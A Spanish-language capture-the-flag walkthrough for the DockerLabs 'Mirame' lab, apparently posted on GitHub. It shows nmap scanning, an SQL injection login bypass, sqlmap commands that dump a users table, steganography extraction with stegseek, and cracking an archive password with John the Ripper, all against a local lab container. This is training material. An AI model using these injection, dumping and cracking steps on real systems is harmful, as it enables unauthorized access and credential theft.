### Mirame - DockerLabs 🇪🇸

#### 1. Primero descargaremos el archivo y encenderemos el laboratorio.
```bash
unzip mirame.zip 
sudo bash ./auto_deploy.sh mirame.tar 
```

<img width="847" height="588" alt="image" src="https://github.com/user-attachments/assets/f93141c2-753e-4972-80c3-ad7585fe0171" />


### 2. Ahora vamos a comprobar la conexión y escanear los puertos mediante nmap.
```bash
 ping -c3 172.17.0.2
nmap -sCV 172.17.0.2
```

<img width="848" height="570" alt="image" src="https://github.com/user-attachments/assets/36edd205-173a-4804-b3ed-04d461f3948a" />


### 3. Entraremos al puerto 80 y nos encontraremos un formulario.

<img width="1063" height="757" alt="image" src="https://github.com/user-attachments/assets/41e68001-78d4-4e7f-a63a-73fe52fb9d14" />


### 4. Entraremos mediante sql injection.
```bash
' OR 1=1 -- -
```

<img width="1079" height="694" alt="image" src="https://github.com/user-attachments/assets/bcb610e3-14dc-4897-8d09-b5fa1255bf64" />


### 5. Veremos que es una web la cual tu introduces un nombre y devuelva un valor de la base de datos.

<img width="1071" height="673" alt="image" src="https://github.com/user-attachments/assets/3076307a-32e2-4bd3-8e37-d06c52f21047" />


### 6. Interceptamos el request con en burp para poder proceder con el sqlmap.

<img width="839" height="1061" alt="image" src="https://github.com/user-attachments/assets/75d4a6b3-eabc-48a5-8eed-b42998569358" />


### 7.1 Utilizaremos sqlmap para confirmar si es vulerable o no.
```bash
sqlmap -u "http://172.17.0.2/auth.php" --data="username=admin&password=admin" -p username
```

<img width="857" height="1036" alt="image" src="https://github.com/user-attachments/assets/255bed13-5d07-4788-b4f9-83da7e44263d" />


### 7.2 Ahora vamos a listar las bases de datos con tambien sqlmap.
```bash
sqlmap -u "http://172.17.0.2/auth.php" --data="username=admin&password=admin" -p username --dbs
```

<img width="853" height="1051" alt="image" src="https://github.com/user-attachments/assets/0379bd3c-1ddd-451e-914e-9a29c1324291" />


### 7.3 Vamos ahora a listar las tablas.
```bash
sqlmap -u "http://172.17.0.2/auth.php" --data="username=admin&password=admin" -p username -D users --tables --batch
```

<img width="852" height="1055" alt="image" src="https://github.com/user-attachments/assets/b0e0c650-ab87-4e3c-8032-a679a6b2f86b" />


### 7.3 Ahora procedemos a listar lo que hay dentro de esa tabla.
```bash
sqlmap -u "http://172.17.0.2/auth.php" --data="username=admin&password=admin" -p username -D users -T usuarios --dump --batch
```

<img width="844" height="1050" alt="image" src="https://github.com/user-attachments/assets/c9db5942-c99c-4302-b790-5f37bb659c6d" />


### 8 Al probar los usuarios en el http podemos encontrar una imagen.

<img width="1072" height="417" alt="image" src="https://github.com/user-attachments/assets/ffdbc526-ef5b-45f3-b8ea-23b8e07b18e9" />


### 9. Iremos ahora a descargar la imagen y extraeremos sus datos ocultos con stegseek
```bash
wget http://172.17.0.2/directoriotravieso/miramebien.jpg
stegseek miramebien.jpg
```

<img width="838" height="349" alt="image" src="https://github.com/user-attachments/assets/b57f3b98-bf60-4cd7-84ae-1f07efff4b5a" />

### 10. Mediante johntheripper sacaremos la hash y lo desempaquetamos.
```bash
 zip2john miramebien.jpg.out > hash_mirabien.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hash_mirabien.txt
 john --show hash_mirabien.txt
 unzip miramebien.jpg.out
 cat secret.txt
```

<img width="845" height="519" alt="image" src="https://github.com/user-attachments/assets/892e37f4-6fba-4c1b-9aff-3139355b9a4c" />






